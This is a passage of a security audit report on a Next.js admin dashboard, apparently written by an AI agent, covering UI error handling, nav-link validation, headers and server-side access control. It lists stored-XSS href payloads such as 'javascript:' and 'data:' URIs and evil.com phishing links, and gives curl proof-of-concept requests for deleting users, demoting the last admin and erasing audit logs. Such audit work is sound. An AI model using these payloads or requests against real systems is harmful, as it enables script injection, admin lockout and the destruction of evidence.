          setError(data.error || "delete_failed");
        }
      } catch {
        setError("network");
      }
    }
  Positives:
    - Uses confirm() dialog before deleting (line 405) ✅
    - credentials: "include" ✅
    - On success, locally filters out the deleted message (line 415)
      instead of refetching the whole list — efficient. ✅
    - Catches network error (line 420) ✅
    - API contract correct: target="message" matches the case in
      api/admin/clear/route.ts:40-48. ✅
    - API also cascades: deletes replies + notes + tag-relations
      (route.ts:43-45) — no orphan rows. ✅
  Negatives:
    1. ⚠️ NO LOADING STATE — async without busy flag. The "🗑️ Delete"
       button (line 478) can be clicked multiple times before the
       first request returns. The second call will hit a 404 (msg
       already deleted) and overwrite a previous success with a
       "message_not_found" error. MED.
    2. ⚠️ NO SUCCESS TOAST — silent. The message just disappears
       from the list. See #7.
    3. ⚠️ STALE ERROR PERSISTS — deleteMessage never clears `error`
       at start. If a previous action failed (e.g., reply_failed),
       the red error banner stays visible even after a successful
       delete. MED (UX).
    4. ⚠️ Uses native browser confirm() — blocks UI thread, not
       styled, not accessible, no i18n in the dialog chrome (only
       the message string is localized). LOW.
    5. ⚠️ NO UNDO — delete is permanent (no soft-delete in DB).
       confirm() is the only safety net. LOW.

EXTRA FINDINGS (outside the 10-item checklist)
================================================================================

E1. TypeScript: messages state typed as `any[] | null` (line 359).
    No type safety on the message or reply shape. If the API changes
    the schema (e.g., renames `replies` to `messageReplies`), the
    panel breaks at runtime with no compile-time signal. LOW.

E2. Accessibility:
    - Reply <textarea> (lines 484-491) has no <label> and no
      aria-label. Screen readers announce it as unlabeled. LOW.
    - Error banner has role="alert" ✅ (good).
    - "Reply" / "Delete" buttons have no aria-label beyond their
      visible text — OK because text is descriptive.
    - No focus management: when reply form opens (line 482-497),
      textarea has `autoFocus` ✅ (good); when form closes, focus
      doesn't return to the "Reply" button that opened it. LOW.

E3. Unused i18n string: parent component's `t` object defines
    `loadingMessages` (lines 167-169) but MessagesPanel doesn't
    receive `t` as a prop and defines its own inline localized
    strings (lines 425, 428-433). Dead code in the parent's i18n
    tables. LOW (code hygiene).

E4. Admin-only gate: MessagesPanel is rendered only when
    `activeTab === "messages" && isAdmin` (line 265-267). Non-admin
    users can't see the tab even if they directly manipulate state.
    ✅ Correct authorization at render layer. Defense-in-depth also
    holds because /api/messages, /api/admin/reply, and
    /api/admin/clear all call checkAdminAuth server-side.

E5. No CSRF token sent — relies on cookies + SameSite attribute
    (set by /api/user/login) + Origin check (in middleware per prior
    SEC-02 audit). The credentials: "include" fetches send the
    session cookie automatically; the Origin header is added by the
    browser. ✅ Consistent with the rest of the admin surface area.

E6. Reply textarea has no Enter-to-send behavior. Admin must click
    "📤 Send". Could add Ctrl+Enter shortcut. LOW.

E7. No optimistic UI for delete — message disappears only after
    the network round trip completes. If the network is slow, the
    deleted message stays visible for seconds, tempting a re-click
    (see #3.1). LOW.

E8. messages state is set to [] on ANY initial fetch failure (both
    data.ok=false at line 371 and network catch at line 375). This
    means after an error, the panel shows the empty state — but
    the `messages` state is now a non-null empty array, so any
    future error from sendReply/deleteMessage will display in the
    banner above an empty list. Confusing UX. MED.

Findings:
  L14 — setLoading(true) at start: ✅ correct (sets loading before async work).
  L16 — credentials: "include" present: ✅.
  L17 — `const data = await res.json();` — NO check on `res.ok` or HTTP
         status. If the server returns 401 (session expired), 403
         (forbidden), 404 (route gone), or 500 (server error) with a
         non-JSON body (e.g., HTML error page), `res.json()` throws →
         caught by empty `catch {}` → UI silently shows whatever items
         were last loaded (or empty array on first load) with NO
         indication of failure. ❌ (MED)
  L18 — `if (data.ok) setItems(data.items || []);` — only updates state
         when server explicitly returns `{ ok: true }`. On `ok: false`
         (e.g., validation error returned as JSON), items are NOT
         updated AND no error is surfaced to the user. Stale data
         displayed silently. ❌ (MED)
  L19 — `catch {}` — completely empty catch block. No `console.error`,
         no `setError(...)`, no toast. ALL errors (network down, JSON
         parse, fetch abort, DNS failure) are silently swallowed. ❌ (MED)
  L20 — setLoading(false) outside try block: ✅ always runs (good).
  L13 (style) — two statements on one line (`const fa = ...; const
         loadItems = ...`) — minor readability nit.

         sets loading=true → component re-renders the early-return
         "loading..." paragraph (line 85) → ENTIRE item list vanishes
         and reappears on every save/delete/toggle/move. Severe
         UX flicker. See finding #8. (MED)
  Race condition: loadItems() is fire-and-forget called from save
         (L43), del (L53), toggle (L62), move (L80) WITHOUT awaiting
         and WITHOUT an AbortController. If user clicks toggle twice
         quickly, two fetches in flight; whichever resolves last
         wins — final state indeterminate and may not match user
         expectation. No request-cancellation guard. (MED)

2. save (create+update) — WEAK (MED)
   src/components/NavMenuManager.tsx:30-44
--------------------------------------------------------------------------------
Code:
  30   const save = async (item: any) => {
  31     const isNew = !item.id;
  32     const action = isNew ? "create" : "update";
  33     const payload: any = { action };
  34     if (!isNew) payload.id = item.id;
  35     payload.data = { ...item };
  36     delete payload.data.id; delete payload.data.createdAt; delete payload.data.updatedAt;
  37     await fetch("/api/admin/nav", {
  38       method: "POST", headers: { "Content-Type": "application/json" },
  39         credentials: "include",
  40       body: JSON.stringify(payload),
  41     });
  42     setEditing(null);
  43     loadItems();
  44   };

Findings:
  L31 — `isNew = !item.id` — relies on `empty` object (L83) NOT having
         `id` field. Confirmed L83 has no `id`. ✅ correct.
  L35 — `payload.data = { ...item };` — spreads ALL fields of `item`
         into payload.data, then deletes id/createdAt/updatedAt on L36.
         ❌ No whitelist: if server returns extra internal fields
         (e.g., `_rev`, `__v`, `createdBy`, `_meta`), they get echoed
         back in update payload and may be persisted or rejected by
         server. Defense-in-depth issue. (LOW-MED)
  L36 — `delete payload.data.id; delete payload.data.createdAt;
         delete payload.data.updatedAt;` — runs for new items too (id
         is undefined → no-op). ✅ harmless.
  L37-41 — `await fetch(...)` — NO try/catch. If fetch throws (network
         down, CORS, DNS), promise rejection is unhandled → React
         console error, user gets NO feedback. ❌ (MED)
  L37-41 — Result of fetch is DISCARDED. NO check on `res.ok`. If
         server returns 400 (validation), 401 (session expired),
         403 (forbidden), 409 (conflict), or 500, the component
         silently proceeds to setEditing(null) on L42 — UI closes
         the editor as if the save succeeded. User loses unsaved
         input. ❌ (HIGH for create, MED for update)
  L39 — credentials: "include" present. ✅
  L42 — `setEditing(null)` runs UNCONDITIONALLY regardless of fetch
         outcome. Closes the editor even on failure. ❌ (MED)
  L43 — `loadItems();` called WITHOUT `await`. Fire-and-forget. If
         loadItems fails, no feedback. ❌ (LOW)
  L112 — save button onClick `() => save(editing)` — NO disabled state
         during in-flight save. User can click "save" multiple times
         before the first fetch resolves → DUPLICATE POSTs (especially
         bad for create: two creates → two items with potentially
         identical labels). No `saving` state variable exists. ❌ (MED)
  NO client-side validation:
    - labelEn/labelFa/labelDe can all be empty strings (L100-102 —
      inputs have no `required` attribute, no min-length check).
      Empty menu items can be created with no visible label. (MED)
    - href can be cleared to "" (L105 — input value is
      `editing.href || ""`, user can delete the default "#"). Empty
      href saved as-is. (MED)
    - See finding #6 for href scheme validation gap.
  NO success feedback. Editor just closes. User has no confirmation
         that save succeeded. See finding #10. ❌

5. move (reorder) — WEAK (MED)
   src/components/NavMenuManager.tsx:65-81
--------------------------------------------------------------------------------
Code:
  65   const move = async (id: string, dir: -1 | 1) => {
  66     const idx = items.findIndex(i => i.id === id);
  67     const newIdx = idx + dir;
  68     if (newIdx < 0 || newIdx >= items.length) return;
  69     // Swap orders
  70     const a = items[idx];
  71     const b = items[newIdx];
  72     await Promise.all([
  73       fetch("/api/admin/nav", { method: "POST", headers: { "Content-Type": "application/json" },
  74         credentials: "include",
  75         body: JSON.stringify({ action: "update", id: a.id, data: { order: b.order } }) }),
  76       fetch("/api/admin/nav", { method: "POST", headers: { "Content-Type": "application/json" },
  77         credentials: "include",
  78         body: JSON.stringify({ action: "update", id: b.id, data: { order: a.order } }) }),
  79     ]);
  80     loadItems();
  81   };

Findings:
  L66 — `findIndex` returns -1 if id not found. NO guard for `idx === -1`.
         If items was mutated or id is stale, `items[idx]` is undefined
         → `a.id` throws TypeError → unhandled. ❌ (LOW — defensive
         missing, but in practice items+id are consistent).
  L67-68 — boundary check `newIdx < 0 || newIdx >= items.length`: ✅
         correct (prevents OOB). But: also implicitly assumes `idx`
         is valid (≥0); see L66 finding.
  L70-71 — `a = items[idx]; b = items[newIdx];` — assumes both items
         exist. If a/b.order are equal (data inconsistency: two items
         with same `order` value), swap is a no-op and the list won't
         reorder. No detection of this case. (LOW)
  L72-79 — Promise.all of TWO fetches:
    ❌ NON-ATOMIC (HIGH for data integrity): if fetch #1 succeeds and
       fetch #2 fails (network blip, server 500 mid-batch), the two
       items now have the SAME `order` value (both = b.order). List
       ordering becomes ambiguous. No transactional API, no
       compensating rollback. The backend has no atomic "swap two
       orders" endpoint exposed. (MED — depends on backend behavior)
    ❌ NO try/catch — if either fetch throws, Promise.all rejects →
       unhandled rejection. (MED)
    ❌ NO `res.ok` check on either fetch. Silent partial failure. (MED)
    ❌ NO error/success feedback. (MED — see finding #10)
  L74, L77 — credentials: "include" present on both. ✅
  L80 — loadItems() not awaited; fire-and-forget refresh.
  L129-130 — move buttons (↑ ↓) have NO disabled state during in-flight
       move. User can rapid-fire ↑↑↑ → multiple overlapping move()
       calls with interleaved Promise.all resolutions → final order
       indeterminate. The `disabled={i === 0}` / `disabled={i ===
       items.length - 1}` (L129-130) only disables at list edges, not
       during requests. ❌ (MED)
  Race with loadItems(): each move() calls loadItems() at the end;
       if user clicks ↑ then ↓ quickly, two move() sequences fire
       with stale `items` snapshots, leading to incorrect swap math.
       (MED)
  Note: move uses `a.order` and `b.order` from the CLIENT's cached
       `items` array, not from the server's current state. If the
       server's `order` values were changed by another admin
       concurrently, the swap uses stale orders. (LOW — concurrent
       admin editing is rare)

6. href scheme validation — FAIL (HIGH — stored XSS vector)
   src/components/NavMenuManager.tsx:83, 100-102, 105, 125
--------------------------------------------------------------------------------
Code:
  L83  const empty = { labelEn: "", labelFa: "", labelDe: "", href: "#", target: "_self", visible: true, order: 99 };
  L105 <input placeholder="Link (e.g. #about or https://...)" value={editing.href || ""} onChange={e => setEditing({ ...editing, href: e.target.value })} style={inputStyle} />

Findings:
  ❌ NO client-side validation of `editing.href` anywhere in the file.
     The href field is a free-text input (L105) with NO scheme
     allowlist, NO regex check, NO sanitization. ANY string can be
     saved as href. (HIGH)
  Vulnerable schemes (all saveable today, persisted to backend):
    - `javascript:alert(document.cookie)` — stored XSS. When the
      public Navbar renders this item as `<a href={item.href}>`, a
      single click executes arbitrary JS in the user's browser.
      React/JSX does NOT auto-sanitize href attributes (this is a
      well-known React footgun — only `href` with `javascript:` is
      flagged in some linters but not stripped at runtime).
    - `data:text/html,<script>alert(1)</script>` — same XSS vector
      via data URI.
    - `vbscript:msgbox("xss")` — legacy IE vector.
    - `//evil.com/path` — protocol-relative URL. On an HTTPS site
      this becomes https://evil.com → silent redirect to attacker.
    - `https://evil.com/phish` — arbitrary external link, phishing.
      No allowlist of trusted domains.
    - `file:///etc/passwd` — local file URI (browser-blocked mostly).
    - `mailto:`, `tel:` — usually safe but unconstrained.
  L83 — default `href: "#"` is safe (fragment-only), but user can
     clear it (empty string) or replace with anything. (MED — empty
     href means link goes nowhere).
  L105 — placeholder text merely HINTS at "#about or https://..."
     without enforcing. (LOW — UX guidance only)
  L125 — `{item.href}` is rendered as plain text inside the manager
     (not as a clickable link), so the manager UI itself doesn't
     execute the XSS. The XSS risk materializes wherever the public
     Navbar component renders `<a href={item.href}>`. (Need separate
     audit of the public Navbar component, but manager is the entry
     point for the malicious payload.) (HIGH — defense-in-depth
     failure: validation should happen at the manager.)
  L106-109 — `target` is constrained to "_self" or "_blank" via a
     `<select>` dropdown: ✅ safe (no `target="_top"` /
     `target="_parent"` escape). But: `target="_blank"` WITHOUT
     `rel="noopener noreferrer"` (rendered elsewhere, presumably in
     the public Navbar) is a `window.opener` reverse-takeover
     vulnerability. The manager doesn't include a `rel` field in
     `empty` (L83) — so the rendered link has no rel attribute. (MED
     — depends on public Navbar rendering, but the data model omits
     `rel`).
  Recommendation (NOT applied — audit only): validate href client-side
     with allowlist `^(#|/|https?://|mailto:|tel:)` before save. Reject
     `javascript:`, `data:`, `vbscript:`, `file:`, `//` (protocol-rel).
     Also enforce `rel="noopener noreferrer"` whenever `target === "_blank"`.

================================================================================
CROSS-REFERENCES (to other potential audit findings)
================================================================================
  - This component is the WRITE PATH for nav menu items. The READ
    path (public Navbar rendering `<a href={item.href} target=
    {item.target}>`) is the EXPLOIT POINT for the javascript: XSS
    vector (finding #6). The Navbar's safety depends entirely on
    whether IT sanitizes href before rendering — which is NOT this
    audit's scope but should be cross-checked in a separate audit.
  - The backend route `/api/admin/nav/route.ts` (confirmed exists
    at /home/z/my-project/src/app/api/admin/nav/route.ts) should
    ALSO validate href server-side (defense-in-depth). Not audited
    here per task scope.
  - The middleware (`src/middleware.ts`) gates /api/admin/* with
    session check (format-only HMAC per prior SEC-02 audit Q3) —
    so unauthenticated users cannot reach the save/toggle/move
    endpoints. But CSRF is still possible (see SEC-02 Q5 — Origin
    check script-bypassable). A malicious same-origin script could
    call /api/admin/nav POST endpoints. The `credentials: "include"`
    on every fetch (finding #7) means cookies ARE sent — good for
    legit auth, but also means CSRF works if Origin check is
    bypassable.
  - The `Promise.all` non-atomicity (finding #5) suggests the
    backend has no atomic "swap orders" endpoint. Backend audit
    would confirm.

--------------------------------------------------------------------------------
  ⚠️ PARTIAL — next.config.ts:6 + src/middleware.ts:104
  Two mechanisms, partially contradictory:
    - next.config.ts:6 — `poweredByHeader: false`. This is the correct way:
      Next.js does NOT emit `X-Powered-By: Next.js` on ANY response
      (static, dynamic, API, error, redirect — all paths).
    - src/middleware.ts:104 — `res.headers.set("X-Powered-By", "")`.
      This RE-ADDS the header with an EMPTY value on every response that
      goes through middleware. Browser receives `X-Powered-By: ` (empty
      value), which is DIFFERENT from "header absent". This contradicts
      the intent of `poweredByHeader: false`.
  Coverage matrix:
    - Static assets (matcher-excluded): NO X-Powered-By at all ✅ (correct,
      matches next.config.ts intent).
    - Dynamic HTML/JSON via NextResponse.next(): X-Powered-By: "" ⚠️.
    - Error responses (429/401/403/413) via addSecurityHeaders: X-Powered-By: "" ⚠️.
    - /user-dashboard 307 redirect (line 183, no addSecurityHeaders call):
      NO X-Powered-By at all (consistent with next.config.ts intent, but
      inconsistent with the other dynamic responses).
  Net effect: the header is fingerprintable as present-but-empty on
    dynamic responses, absent on static + redirect. An attacker can still
    distinguish dynamic vs static paths by the presence of the empty
    header — a minor info leak.
  Fix: delete middleware.ts:104 OR replace with `res.headers.delete("X-Powered-By")`.
  Cross-reference: SEC-08-L1 (prior audit, still open).
  Severity: PARTIAL / LOW (cosmetic — no real info leak since the value is

    - middleware.ts:208-214 — the NextResponse.next() success path sets
      CSP + HSTS + (via addSecurityHeaders) the 5 generic headers. No
      Cache-Control.
  No per-route Cache-Control found in any /api/admin/*/route.ts handler
    either (verified by grep for "Cache-Control|no-store|no-cache|max-age=0
    |must-revalidate" across /home/z/my-project/src — only client-side
    `fetch(..., { cache: "no-store" })` calls were found at lines 42, 87,
    98, 104; these set the FETCH cache, not the HTTP response Cache-Control).
  Impact:
    GET endpoints like /api/admin/users, /api/admin/settings, /api/admin/
    stats, /api/admin/security-dashboard, /api/admin/clips, /api/messages
    return admin-only data with NO Cache-Control: no-store header.
    Next.js defaults to `private, no-cache, no-store, max-age=0,
    must-revalidate` for dynamic API routes in production, but this default
    is NOT enforced on:
      - Intermediate CDNs (Cloudflare, Vercel Edge Cache) which may
        heuristically cache GET responses with 200 status.
      - Shared browser caches (especially on mobile Safari).
      - Server-side proxies that don't honor Next.js's default.
    Risk: admin-only user list / settings / stats cached by a shared CDN
    or shared browser cache and served to an unauthenticated user.
  Recommended fix (one of):
    a. Add Cache-Control: no-store to addSecurityHeaders() — broad, kills
       caching on EVERYTHING (may hurt performance on public pages like
       /, /api/content).
    b. Add a path-specific Cache-Control to next.config.ts headers():
         {
           source: "/((?:api/admin|user-dashboard)(?:/.*)?)",
           headers: [
             { key: "Cache-Control", value: "no-store, no-cache, must-revalidate" },
             { key: "Pragma", value: "no-cache" },
           ],
         }
       (Preferred — surgical, no impact on public paths.)
    c. Set Cache-Control inside each /api/admin/*/route.ts GET handler.
  Cross-reference: F-30 (prior audit, worklog.md:14589-14594, status: open)
    and SEC-08-L4 (prior SEC-08, still open).
  Severity: LOW (Next.js default for dynamic API routes mitigates most of
    the risk; CDN heuristics + Safari quirks remain the residual gap).

    src/app/api/user/verify/route.ts, src/app/api/messages/route.ts,

    prisma/schema.prisma (AccessUser / AccessLog models)

================================================================================
Q1. Per-tab permissions enforced server-side?
================================================================================
  ❌ NO — permissions field is NEVER checked server-side (HIGH)
  Evidence:
    - AccessUser.permissions field exists (prisma/schema.prisma:389) and is
      set/read by the API, but it is NEVER read in any authorization branch.
    - All admin API routes gate via checkAdminAuth (src/lib/admin-auth.ts:25)
      or checkAdminSession (src/lib/admin-session.ts:18), both of which only
      check `user.role !== "admin"`. Neither reads `user.permissions`.
    - /api/admin/users/route.ts:26  (local checkAdmin) — checks role only
    - /api/admin/users/[id]/route.ts:20 — checks role only
    - /api/admin/users/logs/route.ts:17 — checks role only
    - /api/messages/route.ts:14 — checkAdminAuth → role only
    - /api/admin/clips/route.ts:11 — checkAdminSession → role only
    - /api/admin/content/route.ts:18,57 — checkAdminAuth → role only
    - /api/admin/security/route.ts:46 — checkAdminAuth → role only
    - checkAccess() in src/lib/access-auth.ts:111-150 — does NOT read
      `user.permissions` either; it only checks active + expiresAt +
      allowedDays + allowedHourStart/End.
    - The ONLY place `permissions` is consumed is the CLIENT:
      src/app/user-dashboard/page.tsx:134-143 (hasTabAccess) and
      src/app/user-dashboard/page.tsx:265,269,280,291 (&& isAdmin gating).
  Impact:
    - A non-admin user granted e.g. "messages" in the UI sees the Messages
      tab in /user-dashboard, but clicking it triggers /api/messages which
      returns 401 (because their role is "user"). The per-tab permission
      feature is effectively dead for non-admins — it only hides/shows
      client-side tabs.
    - An admin user can access EVERY tab regardless of their own
      `permissions` field (the API requires only role=admin).
    - There is NO server-side enforcement of "user X has permission for tab Y"
      anywhere in the codebase.
  Severity: HIGH (the per-tab permission model is an illusion; defense relies
    entirely on client-side tab hiding, which is bypassable by direct API call
    — though for non-admins the role check still blocks, so direct impact is
    limited. The real risk: admins CANNOT be restricted to a subset of tabs
    server-side; a "limited admin" pattern is impossible to enforce.)
  PoC:
    # Non-admin with permissions="messages" tries the messages API:
    curl -s -X GET "https://victim.com/api/messages" \
      -H "Cookie: access_session=<forged-or-stolen-user-session>"
    # → 401 {"ok":false,"error":"unauthorized"}  (blocked by role check,
    #   NOT by permission check)

================================================================================
Q2. Time-based access enforced server-side?
================================================================================
  ❌ NO (only at the verify endpoint, NOT at admin API routes) (HIGH)
  Evidence:
    - checkAccess() in src/lib/access-auth.ts:111-150 enforces
      allowedDays (line 123-129) and allowedHourStart/End (line 132-147).
    - But checkAccess is called ONLY at src/app/api/user/verify/route.ts:27.
      That endpoint returns the access object to the client (line 33-49) so
      the dashboard can display a warning (user-dashboard/page.tsx:205-211).
      It does NOT block anything server-side; the user is still logged in.
    - Middleware (src/middleware.ts:70-93 hasValidSession) does NOT call
      checkAccess — it only validates the cookie shape (and even that
      without HMAC verification — see prior SEC-02 Q3 finding).
    - checkAdminAuth (src/lib/admin-auth.ts:17-31) checks: session exists,
      user exists, user.active, user.role === "admin". It does NOT check
      allowedHourStart/End or allowedDays.
    - checkAdminSession (src/lib/admin-session.ts:11-24) — same: role +
      active only.
    - Local checkAdmin in /api/admin/users/route.ts:21-28 and
      /api/admin/users/[id]/route.ts:15-22 and /api/admin/users/logs/route.ts:12-19
      — same: role + active only.
    - /api/admin/clips, /api/admin/content, /api/admin/security,
      /api/messages — all use checkAdminAuth/checkAdminSession → none check
      time.
  Impact:
    - An admin whose allowedHours = 9-17 UTC and who logs in at 09:00 can
      continue calling /api/admin/* at 23:00 (or any hour, any day) until
      their 24h session cookie expires — the time window is enforced ONLY
      as a UI hint via /api/user/verify, never as a hard API gate.
    - An admin with allowedDays = "1,2,3,4,5" (Mon-Fri) can still operate
      on weekends.
  Severity: HIGH (time-based access policy is advisory only at the API layer)
  PoC:
    # Admin whose allowedHours=9-17, calling at 02:00 local:
    curl -s -X DELETE "https://victim.com/api/admin/users/<victim-id>" \
      -H "Cookie: access_session=<admin-session-issued-at-09:00>"
    # → 200 {"ok":true} — deletion succeeds despite being outside allowed
    #   hours, because DELETE handler (users/[id]/route.ts:100) only calls
    #   checkAdmin which checks role+active, NOT time.

================================================================================
Q3. Expiry enforced server-side?
================================================================================
  ❌ NO at the admin API layer (only at login + verify) (HIGH)
  Evidence:
    - checkAccess() checks user.expiresAt at src/lib/access-auth.ts:118-120.
    - But checkAccess is called ONLY at /api/user/verify/route.ts:27 (see Q2).
    - /api/user/login/route.ts:79-82 DOES check expiry at login time and
      refuses to issue a session if expired → 403 account_expired. ✅ at login.
    - But once a session is issued (24h maxAge, login/route.ts:111), the
      admin API routes NEVER re-check expiresAt:
        - checkAdminAuth (admin-auth.ts:23-25) — only active + role
        - checkAdminSession (admin-session.ts:16-18) — only active + role
        - /api/admin/users/route.ts:21-28 — only active + role
        - /api/admin/users/[id]/route.ts:15-22 — only active + role
        - /api/admin/users/logs/route.ts:12-19 — only active + role
        - /api/admin/clips, /api/admin/content, /api/admin/security,
          /api/messages — same.
    - Middleware does not check expiresAt either.
  Impact:
    - An admin with expiresAt = 2026-09-30 who logged in on 2026-09-29
      keeps full API access through 2026-09-30+ until the 24h session
      cookie expires. Expiry is enforced at the verify hint only.
    - Worst case: admin sets expiresAt on a contractor's account to

  Severity: HIGH (account-expiry policy is not enforced at the API layer)
  PoC:

Q6. Can admin create another admin?
================================================================================
  ✅/⚠️ YES — no restriction (by design, but worth flagging)
  Evidence:

================================================================================
Q7. Can admin demote self?
================================================================================
  ❌ YES — no protection; critical availability risk (HIGH)
  Evidence:
    - PUT /api/admin/users/[id] ([id]/route.ts:48):
        if (body.role !== undefined) data.role = body.role === "admin" ? "admin" : "user";
      → role change is accepted for ANY target id, including the caller's
        own id.
    - The ONLY self-protection in PUT is at [id]/route.ts:72-74:
        if (id === admin.id && data.active === false) {
          return NextResponse.json({ ok: false, error: "cannot_deactivate_self" }, { status: 400 });
        }
      This guards ONLY active=false. It does NOT guard role="user".
    - There is no "cannot_demote_self" check anywhere.
    - Client UI (AccessUserManager.tsx:325-333) does not prevent picking
      "user" for the currently-logged-in admin either — the role <select>
      is unconditional.
  Impact:
    - An admin can demote themselves to "user" via PUT
      /api/admin/users/<self-id> with body { role: "user" }.
    - After demotion, their session cookie is still valid for up to 24h,
      BUT every subsequent /api/admin/* call will return 401 because
      checkAdminAuth requires role === "admin".
    - If they are the ONLY admin, the system is now PERMANENTLY locked
      out of admin functions: no one can promote users to admin (that
      requires admin role), no one can create new admins. Recovery
      requires direct DB write (e.g. seed_access_users.py or sqlite3).
  Severity: HIGH (single-admin self-demote → permanent admin lockout)
  PoC:
    # Assume admin session cookie for the only admin user
    curl -s -X PUT "https://victim.com/api/admin/users/<self-id>" \
      -H "Content-Type: application/json" \
      -H "Cookie: access_session=<admin-session>" \
      -d '{"role":"user"}'
    # → 200 {"ok":true,"user":{"role":"user",...}}
    # Subsequent /api/admin/users call → 401. No admin left in DB.

================================================================================
Q8. Can admin delete self?
================================================================================
  ✅ NO — explicit guard
  Evidence:
    - DELETE /api/admin/users/[id] ([id]/route.ts:111-114):
        if (id === admin.id) {
          return NextResponse.json({ ok: false, error: "cannot_delete_self" }, { status: 400 });
        }
    - Client also surfaces this error: AccessUserManager.tsx:190,210.
  Severity: PASS

================================================================================
Q9. Can admin delete last admin?
================================================================================
  ⚠️ PARTIAL — no count-based "last admin" protection (MED-HIGH)
  Evidence:
    - DELETE /api/admin/users/[id] ([id]/route.ts:100-126) does NOT count
      active admins before deleting. It only checks: admin auth, id !==
      admin.id (cannot_delete_self, line 112), and target exists (line 117).
    - There is NO query like `db.accessUser.count({ where: { role: "admin",
      active: true }})` anywhere in the codebase (verified via grep for
      "count.*admin" — no matches in src/).
    - PUT /api/admin/users/[id] ([id]/route.ts:48) can flip another admin's
      role to "user" (demote OTHER admins) — also no count check.
    - PUT can also set active=false on another admin ([id]/route.ts:60-65)
      — no count check; only self-deactivate is blocked (line 72).
  Effective protection analysis:
    - Via DELETE alone: an admin cannot delete themselves (Q8), so the
      admin pool can shrink to 1 (the deleter) but not to 0. So strictly
      "delete the last admin via DELETE" is BLOCKED by Q8's self-check.
      ✅ for the narrow DELETE-only interpretation.
    - Via PUT demotion: there is NO "cannot demote last admin" check.
      Combined with Q7 (admin can demote self), an admin can demote
      themselves to user → 0 admins remain → permanent lockout.
    - Via PUT active=false on another admin: an admin can deactivate
      every OTHER admin (no self-deactivate guard for OTHER admins),
      shrinking the active-admin pool to 1 (themselves), then demote
      self → 0 active admins.
  Impact:
    - A compromised or careless admin can render the system unadminable
      without DB-level intervention.
  Severity: MED-HIGH (DELETE-only is safe; PUT demotion/deactivation is
    not — Q7 amplifies this)
  PoC (last-admin lockout via demote-self):
    # 1-admin system. Admin demotes self:
    curl -X PUT "https://victim.com/api/admin/users/<self-id>" \
      -H "Cookie: access_session=<admin-session>" \
      -H "Content-Type: application/json" \
      -d '{"role":"user"}'
    # → 200, role=user. No admin left. Recovery requires direct DB edit.

================================================================================
Q10. User mutations audit-logged?
================================================================================
  ❌ NO — user CRUD produces no audit trail; deletions CASCADE-wipe logs (HIGH)
  Evidence:
    - logAccess (access-auth.ts:155-170) writes to the AccessLog table.
      It is called ONLY from:
        - /api/user/login/route.ts:68,74,80,93 — login_failed,
          access_denied_inactive, access_denied_expired, login_success
        - /api/user/verify/route.ts:30 — access-denial reasons (verify only)
        - /api/admin/security/route.ts:81,96 — password_change_failed,
          password_changed
    - POST /api/admin/users (users/route.ts:65-135) — NO logAccess call.
      Creating a new user (incl. new admin) is invisible to the audit log.
    - PUT /api/admin/users/[id] ([id]/route.ts:27-95) — NO logAccess call.
      Role changes (promote/demote), permission changes, password resets,
      active flips, expiry changes — all silent.
    - DELETE /api/admin/users/[id] ([id]/route.ts:100-126) — NO logAccess call.
    - AccessUserManager.tsx:104 fetches /api/admin/users/logs for display
      in the "📋 Logs" panel — these logs will show ONLY login/access-denial
      events, never user CRUD events. The UI gives a false sense of audit
      completeness.
    - WORSE: schema.prisma:423 — AccessLog.user relation has
      `onDelete: Cascade`. The DELETE handler comment ([id]/route.ts:6,122)
      explicitly notes that AccessLog entries are CASCADE-deleted when a
      user is deleted. So deleting a user ALSO destroys their entire
      login/access history. A malicious admin can delete a user (Q8/Q9
      permitting) and erase their own prior login evidence along with
      the victim's.
  Impact:
    - No audit trail for: user creation, role escalation (user→admin),
      role demotion (admin→user), permission grants, password resets by
      admin, account deactivation, account deletion, expiry changes,
      time-window changes.
    - The "📋 Logs" tab in the admin UI (AccessUserManager.tsx:233-269)
      shows only login events — it does NOT show admin actions.
    - CASCADE deletion on user delete means an admin can cover their
      tracks by deleting the user whose logs they want to hide.
  Severity: HIGH (security-critical mutations are invisible and erasable)
  PoC:
    # Admin deletes a user — no log entry is created, and the victim's
    # entire AccessLog history is cascade-destroyed:
    curl -X DELETE "https://victim.com/api/admin/users/<victim-id>" \
      -H "Cookie: access_session=<admin-session>"
    # → 200 {"ok":true}
    # → SELECT * FROM AccessLog WHERE userId='<victim-id>' → 0 rows
    # → SELECT * FROM AccessLog WHERE action='user_deleted' → 0 rows
    #   (no such action enum exists; no row was ever written)

Final verdict:
  Of the 10 audit questions, 3 PASS (Q4, Q5, Q8), 1 LOW/by-design (Q6),
  1 PARTIAL (Q9), and 5 FAIL/HIGH (Q1, Q2, Q3, Q7, Q10).
  Most serious:
    (a) Q7 + Q9 + Q10 combine into an availability + accountability
        disaster: an admin can demote themselves (Q7), reach zero admins
        (Q9), and leave NO audit trail of having done so (Q10). Worse,
        deleting a user CASCADE-deletes their AccessLog rows, so any
        admin can erase prior login evidence by deleting users.
    (b) Q2 + Q3 mean the entire time-based + expiry-based access model
        is advisory only at the API layer — it's enforced ONLY at
        /api/user/verify (which the dashboard uses to show a warning
        banner). An admin outside their allowed hours or past their
        expiry can still operate every /api/admin/* route until their
        24h session cookie naturally expires.
    (c) Q1 means the per-tab permission model is purely cosmetic for
        non-admins (their direct API calls are blocked by the role
        check, not by their permissions) and impossible to enforce
        for "limited admins" (any admin bypasses all per-tab checks).

  Cross-references to prior findings (still open):
    - SEC-02 Q3  (middleware hasValidSession is format-only, no HMAC) →
      amplified here by Q4: middleware bypass is neutralized only because
      each admin route re-verifies via getSessionFromRequest which DOES
      check the HMAC sig (access-auth.ts:91). If any future admin route
      forgets to call checkAdminAuth/checkAdminSession, the middleware
      format-only check becomes the only gate.
    - SEC-02 Q11 (X-Forwarded-For trusted blindly) → logAccess uses
      getClientIp (access-auth.ts:175-181) which trusts XFF directly,
      so all log entries' ip column is attacker-controllable.

  noUncheckedIndexedAccess analysis (security-relevant):
    Without this flag, `arr[i]` and `obj[key]` return `T` instead of
    `T | undefined`. The middleware's session-cookie parsing at
    src/middleware.ts:~140 does `parts[2]` to access the HMAC signature
    WITHOUT a bounds check. With strict null checks alone, tsc believes
    parts[2] is `string`. Setting noUncheckedIndexedAccess would force
    `string | undefined` and require an explicit guard. This would catch
    the F-1 / SEC-02 Q3 finding (HMAC signature accepted as `undefined`
    when cookie is malformed) at compile time.
    Recommendation: enable `noUncheckedIndexedAccess: true` (do NOT apply).

  ⚠️ PARTIAL — src/app/rss.xml/route.ts:1-45  (MED)

    export async function GET() {
      const articles = await db.article.findMany({ where: { visible: true },
        orderBy: { date: "desc" }, take: 20 });
